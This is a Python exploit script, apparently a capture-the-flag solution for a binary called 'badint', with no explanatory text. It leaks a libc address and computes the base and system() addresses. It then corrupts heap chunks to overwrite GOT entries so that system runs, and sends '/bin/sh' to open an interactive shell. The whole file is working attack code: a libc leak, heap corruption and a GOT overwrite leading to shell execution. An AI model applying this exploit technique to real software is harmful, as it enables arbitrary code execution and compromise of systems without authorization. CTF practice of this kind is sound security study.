from pwn13 import *

atol_got = 0x604068

def do(seq, offset, data):
    print p.recvuntil(": ")
    p.sendline(str(seq))
    print p.recvuntil(": ")
    p.sendline(str(offset))
    print p.recvuntil(": ")
    p.sendline(data)
    print p.recvuntil(": ")
    p.sendline("Yes")
    print p.recvuntil("]: "),
    ret = p.recvline()
    print ret
    return ret

if __name__ == "__main__":
    p = process("./badint")

    #leak
    ret = do(0,8,'a'*256)
    leak = u64(ret[:16].decode("hex"))
    libc_base = leak - 0x3c3b78
    system_addr = libc_base + 0x45390
    fgets_addr = libc_base + 0x6dad0
    print 'libc base', hex(libc_base)
    print 'system addr', hex(system_addr)

    p.heap(0x15c00,0x300)

    #
    do(0,0,'b'*128)
    do(0,0,'c'*96)

    #
    payload = 'd'*96
    payload += "4100000000000000"
    payload += "4240600000000000"
    do(0,24, payload)
    p.heap(0x15c00,0x300)

    #
    payload = 'e'*12
    payload += p64(fgets_addr).encode("hex")
    payload += 'e'*16
    payload += p64(system_addr).encode("hex")
    payload += 'e'*(96-len(payload))
    do(0,0, payload)
    p.heap(0x15c00,0x300)
    p.dump(0x604040, 0x100)

    p.sendline("/bin/sh")
    p.interactive()
    p.close()
